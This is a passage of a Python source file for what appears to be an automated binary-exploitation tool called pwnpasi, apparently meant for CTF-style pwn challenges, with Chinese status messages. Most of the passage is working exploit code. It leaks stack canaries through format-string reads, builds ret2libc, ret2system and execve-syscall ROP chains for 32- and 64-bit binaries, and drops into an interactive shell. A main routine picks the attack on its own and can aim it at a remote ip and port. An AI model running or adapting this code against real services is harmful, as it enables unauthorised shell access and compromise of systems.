	io.sendline(f'%{c}$p'.encode())

	io.recv()

	payload2 = flat([asm('nop') * padding , canary , b'AAAA' * diff, p32(system_addr) , p32(0) , p32(sh_addr)])
	io.recv()
	io.sendline(payload2)
	io.interactive()


def ret2libc_write_x64_canary_remote(program,libc,padding,pop_rdi_addr, pop_rsi_addr, ret_addr ,other_rdi_registers ,other_rsi_registers,url,port,c,diff):
	io = remote(url,port)
	if libc == 1:
		if libc_path == None:
			print('[*]使用 LibcSearcher')
		else:	
			print('[*]用户未指定libc地址')
			libc = ELF(libc_path)
	else:
		libc = ELF(libc)
	e = ELF(program)
	main_addr = e.symbols['main']
	write_plt = e.symbols['write']
	write_got = e.got['write']
	if other_rsi_registers == 1:
		pop_rdi_addr = int(pop_rdi_addr, 16)
		pop_rdi_addr = p64(pop_rdi_addr)
		pop_rsi_addr = int(pop_rsi_addr, 16)
		pop_rsi_addr = p64(pop_rsi_addr)

		io.recv()
		io.sendline(f'%{c}$p'.encode())
		result = io.recvline().decode().strip()
		print(f"canary值为: {result}")
		result = int(result, 16)
		canary = p64(result)

		payload1 = flat([asm('nop') * padding , canary , b'AAAAAAAA' * diff ,pop_rdi_addr , p64(1) , pop_rsi_addr , p64(write_got) , p64(0) , p64(write_plt) , p64(main_addr)])
		io.recv()
		io.sendline(payload1)

	elif other_rdi_registers == 1:
		pop_rdi_addr = int(pop_rdi_addr, 16)
		pop_rdi_addr = p64(pop_rdi_addr)
		pop_rsi_addr = int(pop_rsi_addr, 16)
		pop_rsi_addr = p64(pop_rsi_addr)

		io.recv()
		io.sendline(f'%{c}$p'.encode())
		result = io.recvline().decode().strip()
		print(f"canary值为: {result}")
		result = int(result, 16)
		canary = p64(result)

		payload1 = flat([asm('nop') * padding , canary , b"AAAAAAAA" * diff , pop_rdi_addr , p64(1) , p64(0), pop_rsi_addr , p64(write_got) , p64(write_plt) , p64(main_addr)])
		io.recv()
		io.sendline(payload1)

	elif other_rdi_registers == 0 and other_rsi_registers == 0:
		pop_rdi_addr = int(pop_rdi_addr, 16)
		pop_rdi_addr = p64(pop_rdi_addr)
		pop_rsi_addr = int(pop_rsi_addr, 16)
		pop_rsi_addr = p64(pop_rsi_addr)

		io.recv()
		io.sendline(f'%{c}$p'.encode())
		result = io.recvline().decode().strip()
		print(f"canary值为: {result}")
		result = int(result, 16)
		canary = p64(result)

		payload1 = flat([asm('nop') * padding , pop_rdi_addr , p64(1) , pop_rsi_addr , p64(write_got) , p64(write_plt) , p64(main_addr)])
		io.recv()
		io.sendline(payload1)

	write_addr = u64(io.recv(8))
	print(f'[*]write函数在libc中的地址为: \033[31m{hex(write_addr)}\033[0m')

	if libc == 1:
		libc = LibcSearcher("write",write_addr)
		libcbase = write_addr - libc.dump('write')
		libc_system = libc.dump('system')
		libc_sh = libc.dump('str_bin_sh')
		system_addr = libcbase + libc_system
		print(f'[*]system函数在libc中的地址为: \033[31m{hex(system_addr)}\033[0m')
		sh_addr = libcbase + libc_sh
		print(f'[*]/bin/sh字符串在libc中的地址为: \033[31m{hex(sh_addr)}\033[0m')
		print('\033[31m[*]PWN!!!\033[0m')
	else:
		libc_write = libc.symbols['write']
		libc_system = libc.symbols['system']
		libc_sh = next(libc.search(b'/bin/sh'))
		system_addr = write_addr - libc_write + libc_system
		print(f'[*]system函数在libc中的地址为: \033[31m{hex(system_addr)}\033[0m')
		sh_addr = write_addr - libc_write + libc_sh
		print(f'[*]/bin/sh字符串在libc中的地址为: \033[31m{hex(sh_addr)}\033[0m')
		print('\033[31m[*]PWN!!!\033[0m')

	io.recv()
	io.sendline(f'%{c}$p'.encode())

	io.recv()


	if other_rdi_registers == 1:
		payload2 = flat([asm('nop') * padding ,canary , b"AAAAAAAA" * diff , pop_rdi_addr , p64(sh_addr), p64(0), p64(system_addr) , p64(0)])
	else:
		payload2 = flat([asm('nop') * padding , canary , b"AAAAAAAA" * diff, pop_rdi_addr , p64(sh_addr) ,p64(system_addr) , p64(0)])
	io.recv()
	io.sendline(payload2)
	io.interactive()

def ret2_system_canary_x32(program,libc,padding,libc_path,c,diff):
	io = process(program)
	e = ELF(program)
	system_addr = e.symbols['system']
	print(f'[*]system函数在程序中的地址为: \033[31m{hex(system_addr)}\033[0m')
	bin_sh_addr = next(e.search(b'/bin/sh'))
	print(f'[*]/bin/sh字符串在程序中的地址为: \033[31m{hex(bin_sh_addr)}\033[0m')
	print('\033[31m[*]PWN!!!\033[0m')
	io.recv()
	io.sendline(f'%{c}$p'.encode())
	result = io.recvline().decode().strip()
	print(f"canary值为: {result}")
	result = int(result, 16)
	canary = p32(result)

	payload = flat([asm('nop') * padding , canary, b"AAAA" * diff, p32(system_addr) , p32(0) , p32(bin_sh_addr)])
	io.sendline(payload)
	io.interactive()

def ret2_system_canary_x64(program,libc,padding,pop_rdi_addr,other_rdi_registers,ret_addr,libc_path,c,diff):
	if pop_rdi_addr == None:
		print("pop rdi指令不存在，无法利用")
		sys.exit(0)
	io = process(program)
	e = ELF(program)
	system_addr = e.symbols['system']
	print(f'[*]system函数在程序中的地址为: \033[31m{hex(system_addr)}\033[0m')
	bin_sh_addr = next(e.search(b'/bin/sh'))
	print(f'[*]/bin/sh字符串在程序中的地址为: \033[31m{hex(bin_sh_addr)}\033[0m')
	print('\033[31m[*]PWN!!!\033[0m')
	io.recv()
	io.sendline(f'%{c}$p'.encode())
	result = io.recvline().decode().strip()
	print(f"canary值为: {result}")
	result = int(result, 16)
	canary = p64(result)

	pop_rdi_addr = int(pop_rdi_addr, 16)
	pop_rdi_addr = p64(pop_rdi_addr)
	ret_addr = int(ret_addr, 16)
	ret_addr = p64(ret_addr)

	if other_rdi_registers == 1:
		payload = flat([asm('nop') * padding ,canary , b"AAAAAAAA" * diff, pop_rdi_addr , p64(bin_sh_addr), p64(0),ret_addr, p64(system_addr) , p64(0)])
	elif other_rdi_registers == 0:
		payload = flat([asm('nop') * padding , canary , b"AAAAAAAA" * diff, pop_rdi_addr , p64(bin_sh_addr), ret_addr,p64(system_addr)])
	io.sendline(payload)
	io.interactive()

def ret2_system_x32_canary_remote(program,libc,padding,url,port,c,diff):
	io = remote(url,port)
	e = ELF(program)
	system_addr = e.symbols['system']
	print(f'[*]system函数在程序中的地址为: \033[31m{hex(system_addr)}\033[0m')
	bin_sh_addr = next(e.search(b'/bin/sh'))
	print(f'[*]/bin/sh字符串在程序中的地址为: \033[31m{hex(bin_sh_addr)}\033[0m')
	print('\033[31m[*]PWN!!!\033[0m')
	io.recv()
	io.sendline(f'%{c}$p'.encode())
	result = io.recvline().decode().strip()
	print(f"canary值为: {result}")
	result = int(result, 16)
	canary = p32(result)

	payload = flat([asm('nop') * padding , canary, b"AAAA" * diff, p32(system_addr) , p32(0) , p32(bin_sh_addr)])
	io.sendline(payload)
	io.interactive()

def ret2_system_x64_canary_remote(program,libc,padding,pop_rdi_addr,other_rdi_registers,ret_addr,url,port,c,diff):
	if pop_rdi_addr == None:
		print("pop rdi指令不存在，无法利用")
		sys.exit(0)
	io = remote(url,port)
	e = ELF(program)
	system_addr = e.symbols['system']
	print(f'[*]system函数在程序中的地址为: \033[31m{hex(system_addr)}\033[0m')
	bin_sh_addr = next(e.search(b'/bin/sh'))
	print(f'[*]/bin/sh字符串在程序中的地址为: \033[31m{hex(bin_sh_addr)}\033[0m')
	print('\033[31m[*]PWN!!!\033[0m')
	io.recv()
	io.sendline(f'%{c}$p'.encode())
	result = io.recvline().decode().strip()
	print(f"canary值为: {result}")
	result = int(result, 16)
	canary = p64(result)

	pop_rdi_addr = int(pop_rdi_addr, 16)
	pop_rdi_addr = p64(pop_rdi_addr)
	ret_addr = int(ret_addr, 16)
	ret_addr = p64(ret_addr)

	if other_rdi_registers == 1:
		payload = flat([asm('nop') * padding ,canary , b"AAAAAAAA" * diff, pop_rdi_addr , p64(bin_sh_addr), p64(0),ret_addr, p64(system_addr) , p64(0)])
	elif other_rdi_registers == 0:
		payload = flat([asm('nop') * padding , canary , b"AAAAAAAA" * diff, pop_rdi_addr , p64(bin_sh_addr), ret_addr,p64(system_addr)])
	io.sendline(payload)
	io.interactive()


def execve_canary_syscall(program,padding,pop_eax_addr, pop_ebx_addr, pop_ecx_addr, pop_edx_addr, pop_ecx_ebx_addr , ret_addr, int_0x80):
	if pop_ecx_addr == None:
		io = process(program)
		e = ELF(program)
		bin_sh_addr = next(e.search(b'/bin/sh'))
		print(f'[*]/bin/sh字符串在程序中的地址为: \033[31m{hex(bin_sh_addr)}\033[0m')
		pop_eax_addr = int(pop_eax_addr, 16)
		pop_eax_addr = p32(pop_eax_addr)
		pop_ecx_ebx_addr = int(pop_ecx_ebx_addr, 16)
		pop_ecx_ebx_addr = p32(pop_ecx_ebx_addr)
		pop_edx_addr = int(pop_edx_addr, 16)
		pop_edx_addr = p32(pop_edx_addr)
		int_0x80 = int(int_0x80, 16)
		int_0x80 = p32(int_0x80)

		io.recv()
		io.sendline(f'%{c}$p'.encode())
		result = io.recvline().decode().strip()
		print(f"canary值为: {result}")
		result = int(result, 16)
		canary = p32(result)

		payload = flat([asm('nop') * padding,canary,b"AAAA" * diff, pop_eax_addr, 0xb, pop_ecx_ebx_addr, 0 , bin_sh_addr , pop_edx_addr , 0 , int_0x80])
		io.recv()
		io.sendline(payload)
		print('\033[31m[*]PWN!!!\033[0m')
		io.interactive()
	else:
		io = process(program)
		e = ELF(program)
		bin_sh_addr = next(e.search(b'/bin/sh'))
		print(f'[*]/bin/sh字符串在程序中的地址为: \033[31m{hex(bin_sh_addr)}\033[0m')
		pop_eax_addr = int(pop_eax_addr, 16)
		pop_eax_addr = p32(pop_eax_addr)
		pop_ecx_addr = int(pop_ecx_addr, 16)
		pop_ecx_addr = p32(pop_ecx_addr)
		pop_ebx_addr = int(pop_ebx_addr, 16)
		pop_ebx_addr = p32(pop_ebx_addr)
		pop_edx_addr = int(pop_edx_addr, 16)
		pop_edx_addr = p32(pop_edx_addr)
		int_0x80 = int(int_0x80, 16)
		int_0x80 = p32(int_0x80)

		io.recv()
		io.sendline(f'%{c}$p'.encode())
		result = io.recvline().decode().strip()
		print(f"canary值为: {result}")
		result = int(result, 16)
		canary = p32(result)

		payload = flat([asm('nop') * padding,canary,b"AAAA" * diff, pop_eax_addr, 0xb, pop_ebx_addr, bin_sh_addr , pop_ecx_addr, 0 , pop_edx_addr , 0 , int_0x80])
		io.recv()
		io.sendline(payload)
		print('\033[31m[*]PWN!!!\033[0m')
		io.interactive()

def execve_syscall_remote(program,padding,pop_eax_addr, pop_ebx_addr, pop_ecx_addr, pop_edx_addr, pop_ecx_ebx_addr , ret_addr, int_0x80,url,port,c,diff):
	if pop_ecx_addr == None:
		io = remote(url,port)
		e = ELF(program)
		bin_sh_addr = next(e.search(b'/bin/sh'))
		print(f'[*]/bin/sh字符串在程序中的地址为: \033[31m{hex(bin_sh_addr)}\033[0m')
		pop_eax_addr = int(pop_eax_addr, 16)
		pop_eax_addr = p32(pop_eax_addr)
		pop_ecx_ebx_addr = int(pop_ecx_ebx_addr, 16)
		pop_ecx_ebx_addr = p32(pop_ecx_ebx_addr)
		pop_edx_addr = int(pop_edx_addr, 16)
		pop_edx_addr = p32(pop_edx_addr)
		int_0x80 = int(int_0x80, 16)
		int_0x80 = p32(int_0x80)

		io.recv()
		io.sendline(f'%{c}$p'.encode())
		result = io.recvline().decode().strip()
		print(f"canary值为: {result}")
		result = int(result, 16)
		canary = p32(result)

		payload = flat([asm('nop') * padding,canary,b"AAAA" * diff, pop_eax_addr, 0xb, pop_ecx_ebx_addr, 0 , bin_sh_addr , pop_edx_addr , 0 , int_0x80])
		io.recv()
		io.sendline(payload)
		print('\033[31m[*]PWN!!!\033[0m')
		io.interactive()
	else:
		io = remote(url,port)
		e = ELF(program)
		bin_sh_addr = next(e.search(b'/bin/sh'))
		print(f'[*]/bin/sh字符串在程序中的地址为: \033[31m{hex(bin_sh_addr)}\033[0m')
		pop_eax_addr = int(pop_eax_addr, 16)
		pop_eax_addr = p32(pop_eax_addr)
		pop_ecx_addr = int(pop_ecx_addr, 16)
		pop_ecx_addr = p32(pop_ecx_addr)
		pop_ebx_addr = int(pop_ebx_addr, 16)
		pop_ebx_addr = p32(pop_ebx_addr)
		pop_edx_addr = int(pop_edx_addr, 16)
		pop_edx_addr = p32(pop_edx_addr)
		int_0x80 = int(int_0x80, 16)
		int_0x80 = p32(int_0x80)

		io.recv()
		io.sendline(f'%{c}$p'.encode())
		result = io.recvline().decode().strip()
		print(f"canary值为: {result}")
		result = int(result, 16)
		canary = p32(result)

		payload = flat([asm('nop') * padding,canary,b"AAAA" * diff, pop_eax_addr, 0xb, pop_ebx_addr, bin_sh_addr , pop_ecx_addr, 0 , pop_edx_addr , 0 , int_0x80])
		io.recv()
		io.sendline(payload)
		print('\033[31m[*]PWN!!!\033[0m')
		io.interactive()

if __name__ == '__main__':
	parser = argparse.ArgumentParser(description="My program description")
	parser.add_argument('-l', '--local', type=str, help='')
	parser.add_argument('-ip', '--ip', type=str, help='')
	parser.add_argument('-libc', '--libc', type=str, help='')
	parser.add_argument('-p', '--port', type=str, help='')
	parser.add_argument('-f', '--fill', type=str, help='')
	args = parser.parse_args()

	if not any(vars(args).values()):
		print("-l, --local          Required parameter, used to specify local file")
		print("-ip, --ip            Used to specify remote servers")
		print("-p, --port           Used to specify remote port")
		print("-libc, --libc        Used to specify local libc")
		print("-f, --fill           The number of characters that can cause overflow")
		print("")
		print("Usage:")
		print("python pwnpasi.py -l babypwn")
		print("python pwnpasi.py -l babypwn -f 112")
		print("python pwnpasi.py -l babypwn -libc ./libc-2.19.so")
		print("python pwnpasi.py -l babypwn -libc ./libc-2.19.so -ip 192.168.0.1 -p 33333")
		sys.exit(0)

	libc_path = None
	program = args.local
	program = add_current_directory_prefix(program)
	libc = args.libc
	if not libc:
		libc = 1
		libc_path = ldd_libc(program)
	url = args.ip
	port = args.port

	print("[*]赋予程序读写权限")
	Set_Permission(program)
	print("完成")
	print("[*]搜集程序信息")
	print("--------------------program information--------------------")
	stack, rwx, bit ,pie = Information_Collection(program)
	print("-----------------------------------------------------------")
	print("完成")
	print("[*]分析程序plt表")
	print("-------------------------PLT Table-------------------------")
	function_addresses = Objdump_Scan(program)
	print("-----------------------------------------------------------")
	print("完成")
	function_flags = set_Function_Flag()
	for func, value in function_flags.items():
		globals()[func] = value

	if bit == 64:
		print("[*]查找程序内可利用的汇编指令地址")
		print("------------------------ROP gadgets------------------------")
		pop_rdi_addr, pop_rsi_addr, ret_addr ,other_rdi_registers ,other_rsi_registers= set_x64_Rop(program)
		print("-----------------------------------------------------------")
		print("完成")

	if bit == 32:
		print("[*]查找程序内可利用的汇编指令地址")
		print("------------------------ROP gadgets------------------------")
		pop_eax_addr, pop_ebx_addr, pop_ecx_addr,pop_edx_addr , pop_ecx_ebx_addr , ret_addr, int_0x80 , eax, ebx ,ecx ,edx = set_x32_Rop(program)
		print("-----------------------------------------------------------")
		print("完成")

	if args.fill:
		padding = int(args.fill)
		print(f"[*]用户指定造成溢出的字符数为: \033[31m{padding}\033[0m")

	if stack == 1:
		print("[*]canary防护存在")
		print("[*]测试程序是否存在格式化字符串漏洞")
		fmtstr = detect_format_string_vulnerability(program)
		if fmtstr == 1:
			print("[*]开始泄露canary的值")
			leakage_canary_value(program)
			padding, c, diff = canary_fuzz(program,bit)
			if padding == None and c == None and diff == None:
				print("")

			else:

				if url and port:
					print("[*]Remote execution mode")
					if system == 1 and bin_sh == 1:
						if bit == 32:
							ret2_system_x32_canary_remote(program,libc,padding,url,port,c,diff)
							sys.exit(0)
						if bit == 64:
							ret2_system_x64_canary_remote(program,libc,padding,pop_rdi_addr,other_rdi_registers,ret_addr,url,port,c,diff)
							sys.exit(0)

					if puts == 1:
						if bit ==32:
							ret2libc_put_x32_canary_remote(program,libc,padding,url,port,c,diff)
							sys.exit(0)
						if bit == 64:
							ret2libc_put_x64_canary_remote(program,libc,padding,pop_rdi_addr, pop_rsi_addr, ret_addr ,other_rdi_registers ,other_rsi_registers,url,port,c,diff)
							sys.exit(0)

					if write == 1:
						if bit == 32:
							ret2libc_write_x32_canary_remote(program,libc,padding,url,port,c,diff)
							sys.exit(0)
						if bit == 64:
							ret2libc_write_x64_canary_remote(program,libc,padding,pop_rdi_addr, pop_rsi_addr, ret_addr ,other_rdi_registers ,other_rsi_registers,url,port,c,diff)
							sys.exit(0)

					if bit ==32:		
						if bin_sh == 1 and eax == 1 and ebx == 1 and ecx == 1 and edx == 1:
							execve_syscall_remote(program,padding,pop_eax_addr, pop_ebx_addr, pop_ecx_addr, pop_edx_addr, pop_ecx_ebx_addr , ret_addr, int_0x80,url,port,c,diff)

				else:
					print('[*]Local execution mode')
					if system == 1 and bin_sh == 1:
						if bit == 32:
							ret2_system_canary_x32(program,libc,padding,libc_path,c,diff)
							sys.exit(0)
						if bit == 64:
							ret2_system_canary_x64(program,libc,padding,pop_rdi_addr,other_rdi_registers,ret_addr,libc_path,c,diff)
							sys.exit(0)

					if puts == 1:
						if bit == 32:
							ret2libc_put_canary_x32(program,libc,libc_path,padding,c,diff)
							sys.exit(0)
						if bit == 64:
							ret2libc_put_canary_x64(program,libc,pop_rdi_addr, pop_rsi_addr, ret_addr ,other_rdi_registers ,other_rsi_registers,libc_path,padding,c,diff)
							sys.exit(0)

					if write == 1:
						if bit == 32:
							ret2libc_write_canary_x32(program,libc,padding,libc_path,c,diff)
							sys.exit(0)
						if bit == 64:
							ret2libc_write_canary_x64(program,libc,padding,pop_rdi_addr, pop_rsi_addr, ret_addr ,other_rdi_registers ,other_rsi_registers,libc_path,c,diff)
							sys.exit(0)

					if bit ==32:
						if bin_sh == 1 and eax == 1 and ebx == 1 and ecx == 1 and edx == 1:
							execve_canary_syscall(program,padding,pop_eax_addr, pop_ebx_addr, pop_ecx_addr, pop_edx_addr, pop_ecx_ebx_addr , ret_addr, int_0x80)

				sys.exit(0)


	if not args.fill:
		print("[*]测试程序是否存在栈溢出漏洞")
		padding = Test_Stack_Overflow(program,bit)
		
	print("完成")
	print("[*]开始对程序尝试PWN...")
	

	if padding == 0:
		print("[*]测试程序是否存在格式化字符串漏洞")
		fmtstr = detect_format_string_vulnerability(program)
		if check_binsh(program):
			print('[*]/bin/sh字符存在')
			bin_sh = 1
		else:
			bin_sh = 0

		if url and port:
			print("[*]Remote execution mode")
			if system == 1 and bin_sh == 1 :
				print('[*]泄露程序字符串')
				fmtstr_print_strings_remote(program,url,port)
				offset = find_offset(program)
				log.info(f"Offset found: \033[31m{offset}\033[0m")
				function, buf_addr , function_name = find_ftmstr_bss_symbols(program)
				system_fmtstr_remote(program,offset,buf_addr,url,port)
				sys.exit(0)
			else:
				print('[*]未找到程序if判断与后门函数，泄露程序字符串')
				fmtstr_print_strings_remote(program,url,port)
				sys.exit(0)


		else:
			print('[*]Local execution mode')
			if system == 1 and bin_sh == 1 :
				print('[*]泄露程序字符串')
				fmtstr_print_strings(program)
				offset = find_offset(program)
				log.info(f"Offset found: \033[31m{offset}\033[0m")
				function, buf_addr , function_name = find_ftmstr_bss_symbols(program)
				system_fmtstr(program,offset,buf_addr)
				sys.exit(0)
			else:
				print('[*]未找到程序if判断与后门函数，泄露程序字符串')
				fmtstr_print_strings(program)
				sys.exit(0)

	else:
		if check_binsh(program):
			print('[*]/bin/sh字符存在')
			bin_sh = 1
		else:
			bin_sh = 0

		if url and port:
			print("[*]Remote execution mode")
			if pie == 1 and backdoor == 1:
				print("[*]PIE防护启动，但后门函数存在，启动爆破")
				pie_backdoor_exploit_remote(program,padding,backdoor,libc_path,libc,url,port,callsystem)
				sys.exit(0)
			
			if system == 1 and bin_sh == 1:
				if bit == 32:
					ret2_system_x32_remote(program,libc,padding,url,port)
					sys.exit(0)
				if bit == 64:
					ret2_system_x64_remote(program,libc,padding,pop_rdi_addr,other_rdi_registers,ret_addr,url,port)
					sys.exit(0)

			if write == 1:
				if bit == 32:
					ret2libc_write_x32_remote(program,libc,padding,url,port)
					sys.exit(0)
				if bit == 64:
					ret2libc_write_x64_remote(program,libc,padding,pop_rdi_addr, pop_rsi_addr, ret_addr ,other_rdi_registers ,other_rsi_registers,url,port)
					sys.exit(0)

			if puts == 1:
				if bit ==32:
					ret2libc_put_x32_remote(program,libc,padding,url,port)
					sys.exit(0)
				if bit == 64:
					ret2libc_put_x64_remote(program,libc,padding,pop_rdi_addr, pop_rsi_addr, ret_addr ,other_rdi_registers ,other_rsi_registers,url,port)
					sys.exit(0)

			if rwx == 1:
				if bit == 32:			
					function, buf_addr , function_name = find_large_bss_symbols(program)
					if function == 1:
						rwx_shellcode_x32_remote(program, buf_addr, padding, function_name,ret_addr,url,port)
						sys.exit(0)
				if bit == 64:
					function, buf_addr , function_name = find_large_bss_symbols(program)
					if function == 1:
						rwx_shellcode_x64_remote(program, buf_addr, padding, function_name,ret_addr,url,port)
						sys.exit(0)

			if bit ==32:		
				if bin_sh == 1 and eax == 1 and ebx == 1 and ecx == 1 and edx == 1:
					execve_syscall_remote(program,padding,pop_eax_addr, pop_ebx_addr, pop_ecx_addr, pop_edx_addr, pop_ecx_ebx_addr , ret_addr, int_0x80,url,port)


		else:
			print('[*]Local execution mode')
			if pie == 1 and backdoor == 1:
				print("[*]PIE防护启动，但后门函数存在，启动爆破")
				pie_backdoor_exploit(program,padding,backdoor,libc_path,libc,callsystem)
				sys.exit(0)


			if system == 1 and bin_sh == 1:
				if bit == 32:
					ret2_system_x32(program,libc,padding,libc_path)
					sys.exit(0)
				if bit == 64:
					ret2_system_x64(program,libc,padding,pop_rdi_addr,other_rdi_registers,ret_addr,libc_path)
					sys.exit(0)

			if write == 1:
				if bit == 32:
					ret2libc_write_x32(program,libc,padding,libc_path)
					sys.exit(0)
				if bit == 64:
					ret2libc_write_x64(program,libc,padding,pop_rdi_addr, pop_rsi_addr, ret_addr ,other_rdi_registers ,other_rsi_registers,libc_path)
					sys.exit(0)

			if puts == 1:
				if bit ==32:
					ret2libc_put_x32(program,libc,padding,libc_path)
					sys.exit(0)
				if bit ==64:
					ret2libc_put_x64(program,libc,padding,pop_rdi_addr, pop_rsi_addr, ret_addr ,other_rdi_registers ,other_rsi_registers,libc_path)
					sys.exit(0)


			if rwx == 1:
				if bit == 32:
					function, buf_addr , function_name = find_large_bss_symbols(program)
					if function == 1:
						rwx_shellcode_x32(program, buf_addr, padding, function_name,ret_addr,libc_path)
						sys.exit(0)
				if bit == 64:
					function, buf_addr , function_name = find_large_bss_symbols(program)
					if function == 1:
						rwx_shellcode_x64(program, buf_addr, padding, function_name,ret_addr,libc_path)
						sys.exit(0)


			if bit ==32:
				if bin_sh == 1 and eax == 1 and ebx == 1 and ecx == 1 and edx == 1:
					execve_syscall(program,padding,pop_eax_addr, pop_ebx_addr, pop_ecx_addr, pop_edx_addr, pop_ecx_ebx_addr , ret_addr, int_0x80)


